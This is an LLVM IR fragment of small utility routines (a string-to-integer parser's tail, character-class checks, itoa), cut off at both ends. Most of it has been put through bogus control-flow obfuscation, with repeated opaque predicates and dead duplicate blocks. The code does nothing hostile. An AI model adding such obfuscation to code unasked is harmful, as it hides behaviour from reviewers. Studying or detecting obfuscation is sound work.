  %78 = trunc i64 %77 to i32
  store i32 %78, i32* %10, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sext i32 %79 to i64
  %81 = load i64, i64* %7, align 8
  %82 = udiv i64 %81, %80
  store i64 %82, i64* %7, align 8
  store i64 0, i64* %5, align 8
  store i32 0, i32* %9, align 4
  br label %83

; <label>:83:                                     ; preds = %originalBBpart224, %70
  %84 = load i32, i32* %6, align 4
  %85 = trunc i32 %84 to i8
  %86 = call i32 @util_isdigit(i8 signext %85)
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %91

; <label>:88:                                     ; preds = %83
  %89 = load i32, i32* %6, align 4
  %90 = sub nsw i32 %89, 48
  store i32 %90, i32* %6, align 4
  br label %154

; <label>:91:                                     ; preds = %83
  %92 = load i32, i32* @x.67
  %93 = load i32, i32* @y.68
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %91
  %100 = load i32, i32* %6, align 4
  %101 = trunc i32 %100 to i8
  %102 = call i32 @util_isalpha(i8 signext %101)
  %103 = icmp ne i32 %102, 0
  %104 = load i32, i32* @x.67
  %105 = load i32, i32* @y.68
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %103, label %112, label %120

; <label>:112:                                    ; preds = %originalBBpart28
  %113 = load i32, i32* %6, align 4
  %114 = trunc i32 %113 to i8
  %115 = call i32 @util_isupper(i8 signext %114)
  %116 = icmp ne i32 %115, 0
  %117 = select i1 %116, i32 55, i32 87
  %118 = load i32, i32* %6, align 4
  %119 = sub nsw i32 %118, %117
  store i32 %119, i32* %6, align 4
  br label %137

; <label>:120:                                    ; preds = %originalBBpart28
  %121 = load i32, i32* @x.67
  %122 = load i32, i32* @y.68
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %120
  %129 = load i32, i32* @x.67
  %130 = load i32, i32* @y.68
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %222

; <label>:137:                                    ; preds = %112
  %138 = load i32, i32* @x.67
  %139 = load i32, i32* @y.68
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %137
  %146 = load i32, i32* @x.67
  %147 = load i32, i32* @y.68
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %154

; <label>:154:                                    ; preds = %originalBBpart216, %88
  %155 = load i32, i32* @x.67
  %156 = load i32, i32* @y.68
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %154
  %163 = load i32, i32* %6, align 4
  %164 = load i32, i32* %4, align 4
  %165 = icmp sge i32 %163, %164
  %166 = load i32, i32* @x.67
  %167 = load i32, i32* @y.68
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %165, label %174, label %175

; <label>:174:                                    ; preds = %originalBBpart220
  br label %222

; <label>:175:                                    ; preds = %originalBBpart220
  %176 = load i32, i32* %9, align 4
  %177 = icmp slt i32 %176, 0
  br i1 %177, label %190, label %178

; <label>:178:                                    ; preds = %175
  %179 = load i64, i64* %5, align 8
  %180 = load i64, i64* %7, align 8
  %181 = icmp ugt i64 %179, %180
  br i1 %181, label %190, label %182

; <label>:182:                                    ; preds = %178
  %183 = load i64, i64* %5, align 8
  %184 = load i64, i64* %7, align 8
  %185 = icmp eq i64 %183, %184
  br i1 %185, label %186, label %191

; <label>:186:                                    ; preds = %182
  %187 = load i32, i32* %6, align 4
  %188 = load i32, i32* %10, align 4
  %189 = icmp sgt i32 %187, %188
  br i1 %189, label %190, label %191

; <label>:190:                                    ; preds = %186, %178, %175
  store i32 -1, i32* %9, align 4
  br label %200

; <label>:191:                                    ; preds = %186, %182
  store i32 1, i32* %9, align 4
  %192 = load i32, i32* %4, align 4
  %193 = sext i32 %192 to i64
  %194 = load i64, i64* %5, align 8
  %195 = mul i64 %194, %193
  store i64 %195, i64* %5, align 8
  %196 = load i32, i32* %6, align 4
  %197 = sext i32 %196 to i64
  %198 = load i64, i64* %5, align 8
  %199 = add i64 %198, %197
  store i64 %199, i64* %5, align 8
  br label %200

; <label>:200:                                    ; preds = %191, %190
  br label %201

; <label>:201:                                    ; preds = %200
  %202 = load i32, i32* @x.67
  %203 = load i32, i32* @y.68
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %201
  %210 = load i8*, i8** %3, align 8
  %211 = getelementptr inbounds i8, i8* %210, i32 1
  store i8* %211, i8** %3, align 8
  %212 = load i8, i8* %210, align 1
  %213 = sext i8 %212 to i32
  store i32 %213, i32* %6, align 4
  %214 = load i32, i32* @x.67
  %215 = load i32, i32* @y.68
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %83

; <label>:222:                                    ; preds = %174, %originalBBpart212
  %223 = load i32, i32* @x.67
  %224 = load i32, i32* @y.68
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %222
  %231 = load i32, i32* %9, align 4
  %232 = icmp slt i32 %231, 0
  %233 = load i32, i32* @x.67
  %234 = load i32, i32* @y.68
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %232, label %241, label %245

; <label>:241:                                    ; preds = %originalBBpart228
  %242 = load i32, i32* %8, align 4
  %243 = icmp ne i32 %242, 0
  %244 = select i1 %243, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %244, i64* %5, align 8
  br label %284

; <label>:245:                                    ; preds = %originalBBpart228
  %246 = load i32, i32* @x.67
  %247 = load i32, i32* @y.68
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %245
  %254 = load i32, i32* %8, align 4
  %255 = icmp ne i32 %254, 0
  %256 = load i32, i32* @x.67
  %257 = load i32, i32* @y.68
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %255, label %264, label %283

; <label>:264:                                    ; preds = %originalBBpart232
  %265 = load i32, i32* @x.67
  %266 = load i32, i32* @y.68
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %264
  %273 = load i64, i64* %5, align 8
  %274 = sub i64 0, %273
  store i64 %274, i64* %5, align 8
  %275 = load i32, i32* @x.67
  %276 = load i32, i32* @y.68
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBBpart239, label %originalBB34alteredBB

originalBBpart239:                                ; preds = %originalBB34
  br label %283

; <label>:283:                                    ; preds = %originalBBpart239, %originalBBpart232
  br label %284

; <label>:284:                                    ; preds = %283, %241
  %285 = load i32, i32* @x.67
  %286 = load i32, i32* @y.68
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %284
  %293 = load i64, i64* %5, align 8
  %294 = trunc i64 %293 to i32
  %295 = load i32, i32* @x.67
  %296 = load i32, i32* @y.68
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  ret i32 %294

originalBBalteredBB:                              ; preds = %originalBB, %21
  %303 = load i32, i32* %6, align 4
  %304 = icmp eq i32 %303, 45
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %40
  store i32 1, i32* %8, align 4
  %305 = load i8*, i8** %3, align 8
  %306 = getelementptr inbounds i8, i8* %305, i32 1
  store i8* %306, i8** %3, align 8
  %307 = load i8, i8* %305, align 1
  %308 = sext i8 %307 to i32
  store i32 %308, i32* %6, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %91
  %309 = load i32, i32* %6, align 4
  %310 = trunc i32 %309 to i8
  %311 = call i32 @util_isalpha(i8 signext %310)
  %312 = icmp ne i32 %311, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %120
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %137
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %154
  %313 = load i32, i32* %6, align 4
  %314 = load i32, i32* %4, align 4
  %315 = icmp sge i32 %313, %314
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %201
  %316 = load i8*, i8** %3, align 8
  %317 = getelementptr inbounds i8, i8* %316, i32 1
  store i8* %317, i8** %3, align 8
  %318 = load i8, i8* %316, align 1
  %319 = sext i8 %318 to i32
  store i32 %319, i32* %6, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %222
  %320 = load i32, i32* %9, align 4
  %321 = icmp slt i32 %320, 0
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %245
  %322 = load i32, i32* %8, align 4
  %323 = icmp ne i32 %322, 0
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %264
  %324 = load i64, i64* %5, align 8
  %_ = shl i64 0, %324
  %_35 = shl i64 0, %324
  %_36 = sub i64 0, 0
  %gen = add i64 %_36, %324
  %_37 = shl i64 0, %324
  %325 = sub i64 0, %324
  store i64 %325, i64* %5, align 8
  br label %originalBB34

originalBB41alteredBB:                            ; preds = %originalBB41, %284
  %326 = load i64, i64* %5, align 8
  %327 = trunc i64 %326 to i32
  br label %originalBB41
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isspace(i8 signext) #0 {
  %2 = load i32, i32* @x.69
  %3 = load i32, i32* @y.70
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8, align 1
  store i8 %0, i8* %10, align 1
  %11 = load i8, i8* %10, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp eq i32 %12, 32
  %14 = load i32, i32* @x.69
  %15 = load i32, i32* @y.70
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %50, label %22

; <label>:22:                                     ; preds = %originalBBpart2
  %23 = load i8, i8* %10, align 1
  %24 = sext i8 %23 to i32
  %25 = icmp eq i32 %24, 9
  br i1 %25, label %50, label %26

; <label>:26:                                     ; preds = %22
  %27 = load i8, i8* %10, align 1
  %28 = sext i8 %27 to i32
  %29 = icmp eq i32 %28, 10
  br i1 %29, label %50, label %30

; <label>:30:                                     ; preds = %26
  %31 = load i32, i32* @x.69
  %32 = load i32, i32* @y.70
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  %39 = load i8, i8* %10, align 1
  %40 = sext i8 %39 to i32
  %41 = icmp eq i32 %40, 10
  %42 = load i32, i32* @x.69
  %43 = load i32, i32* @y.70
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %50

; <label>:50:                                     ; preds = %originalBBpart24, %26, %22, %originalBBpart2
  %51 = phi i1 [ true, %26 ], [ true, %22 ], [ true, %originalBBpart2 ], [ %41, %originalBBpart24 ]
  %52 = load i32, i32* @x.69
  %53 = load i32, i32* @y.70
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %50
  %60 = zext i1 %51 to i32
  %61 = load i32, i32* @x.69
  %62 = load i32, i32* @y.70
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %60

originalBBalteredBB:                              ; preds = %originalBB, %1
  %69 = alloca i8, align 1
  store i8 %0, i8* %69, align 1
  %70 = load i8, i8* %69, align 1
  %71 = sext i8 %70 to i32
  %72 = icmp eq i32 %71, 32
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  %73 = load i8, i8* %10, align 1
  %74 = sext i8 %73 to i32
  %75 = icmp eq i32 %74, 10
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %50
  %76 = zext i1 %51 to i32
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isdigit(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 48
  br i1 %5, label %6, label %10

; <label>:6:                                      ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 57
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ false, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isalpha(i8 signext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
  br i1 %5, label %6, label %10

; <label>:6:                                      ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br i1 %9, label %36, label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = load i32, i32* @x.73
  %12 = load i32, i32* @y.74
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i8, i8* %2, align 1
  %20 = sext i8 %19 to i32
  %21 = icmp sge i32 %20, 97
  %22 = load i32, i32* @x.73
  %23 = load i32, i32* @y.74
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %21, label %30, label %34

; <label>:30:                                     ; preds = %originalBBpart2
  %31 = load i8, i8* %2, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp sle i32 %32, 122
  br label %34

; <label>:34:                                     ; preds = %30, %originalBBpart2
  %35 = phi i1 [ false, %originalBBpart2 ], [ %33, %30 ]
  br label %36

; <label>:36:                                     ; preds = %34, %6
  %37 = phi i1 [ true, %6 ], [ %35, %34 ]
  %38 = zext i1 %37 to i32
  ret i32 %38

originalBBalteredBB:                              ; preds = %originalBB, %10
  %39 = load i8, i8* %2, align 1
  %40 = sext i8 %39 to i32
  %41 = icmp sge i32 %40, 97
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @util_isupper(i8 signext) #0 {
  %2 = load i32, i32* @x.75
  %3 = load i32, i32* @y.76
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8, align 1
  store i8 %0, i8* %10, align 1
  %11 = load i8, i8* %10, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp sge i32 %12, 65
  %14 = load i32, i32* @x.75
  %15 = load i32, i32* @y.76
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %22, label %42

; <label>:22:                                     ; preds = %originalBBpart2
  %23 = load i32, i32* @x.75
  %24 = load i32, i32* @y.76
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %22
  %31 = load i8, i8* %10, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp sle i32 %32, 90
  %34 = load i32, i32* @x.75
  %35 = load i32, i32* @y.76
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %42

; <label>:42:                                     ; preds = %originalBBpart24, %originalBBpart2
  %43 = phi i1 [ false, %originalBBpart2 ], [ %33, %originalBBpart24 ]
  %44 = zext i1 %43 to i32
  ret i32 %44

originalBBalteredBB:                              ; preds = %originalBB, %1
  %45 = alloca i8, align 1
  store i8 %0, i8* %45, align 1
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp sge i32 %47, 65
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %22
  %49 = load i8, i8* %10, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp sle i32 %50, 90
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i8* @util_itoa(i32, i32, i8*) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca [34 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %7, align 8
  %14 = icmp eq i8* %13, null
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %3
  store i8* null, i8** %4, align 8
  br label %161

; <label>:16:                                     ; preds = %3
  %17 = load i32, i32* %5, align 4
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %154

; <label>:19:                                     ; preds = %16
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  store i32 32, i32* %10, align 4
  %20 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 33
  store i8 0, i8* %20, align 1
  %21 = load i32, i32* %6, align 4
  %22 = icmp eq i32 %21, 10
  br i1 %22, label %23, label %45

; <label>:23:                                     ; preds = %19
  %24 = load i32, i32* %5, align 4
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %45

; <label>:26:                                     ; preds = %23
  %27 = load i32, i32* @x.77
  %28 = load i32, i32* @y.78
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %26
  store i32 1, i32* %9, align 4
  %35 = load i32, i32* %5, align 4
  %36 = sub nsw i32 0, %35
  store i32 %36, i32* %12, align 4
  %37 = load i32, i32* @x.77
  %38 = load i32, i32* @y.78
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %47

; <label>:45:                                     ; preds = %23, %19
  store i32 0, i32* %9, align 4
  %46 = load i32, i32* %5, align 4
  store i32 %46, i32* %12, align 4
  br label %47

; <label>:47:                                     ; preds = %45, %originalBBpart2
  br label %48

; <label>:48:                                     ; preds = %originalBBpart246, %47
  %49 = load i32, i32* %12, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %106

; <label>:51:                                     ; preds = %48
  %52 = load i32, i32* @x.77
  %53 = load i32, i32* @y.78
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %51
  %60 = load i32, i32* %12, align 4
  %61 = load i32, i32* %6, align 4
  %62 = urem i32 %60, %61
  store i32 %62, i32* %11, align 4
  %63 = load i32, i32* %11, align 4
  %64 = icmp slt i32 %63, 10
  %65 = load i32, i32* @x.77
  %66 = load i32, i32* @y.78
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart221, label %originalBB13alteredBB

originalBBpart221:                                ; preds = %originalBB13
  br i1 %64, label %73, label %76

; <label>:73:                                     ; preds = %originalBBpart221
  %74 = load i32, i32* %11, align 4
  %75 = add nsw i32 %74, 48
  store i32 %75, i32* %11, align 4
  br label %79

; <label>:76:                                     ; preds = %originalBBpart221
  %77 = load i32, i32* %11, align 4
  %78 = add nsw i32 %77, 55
  store i32 %78, i32* %11, align 4
  br label %79

; <label>:79:                                     ; preds = %76, %73
  %80 = load i32, i32* @x.77
  %81 = load i32, i32* @y.78
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %79
  %88 = load i32, i32* %11, align 4
  %89 = trunc i32 %88 to i8
  %90 = load i32, i32* %10, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %91
  store i8 %89, i8* %92, align 1
  %93 = load i32, i32* %6, align 4
  %94 = load i32, i32* %12, align 4
  %95 = udiv i32 %94, %93
  store i32 %95, i32* %12, align 4
  %96 = load i32, i32* %10, align 4
  %97 = add nsw i32 %96, -1
  store i32 %97, i32* %10, align 4
  %98 = load i32, i32* @x.77
  %99 = load i32, i32* @y.78
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart246, label %originalBB23alteredBB

originalBBpart246:                                ; preds = %originalBB23
  br label %48

; <label>:106:                                    ; preds = %48
  %107 = load i32, i32* %9, align 4
  %108 = icmp ne i32 %107, 0
  br i1 %108, label %109, label %129

; <label>:109:                                    ; preds = %106
  %110 = load i32, i32* @x.77
  %111 = load i32, i32* @y.78
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %109
  %118 = load i32, i32* %10, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %119
  store i8 45, i8* %120, align 1
  %121 = load i32, i32* @x.77
  %122 = load i32, i32* @y.78
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br label %132

; <label>:129:                                    ; preds = %106
  %130 = load i32, i32* %10, align 4
  %131 = add nsw i32 %130, 1
  store i32 %131, i32* %10, align 4
  br label %132

; <label>:132:                                    ; preds = %129, %originalBBpart250
  %133 = load i32, i32* @x.77
  %134 = load i32, i32* @y.78
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %132
  %141 = load i8*, i8** %7, align 8
  %142 = load i32, i32* %10, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds [34 x i8], [34 x i8]* %8, i64 0, i64 %143
  %145 = call i32 @util_strcpy(i8* %141, i8* %144)
  %146 = load i32, i32* @x.77
  %147 = load i32, i32* @y.78
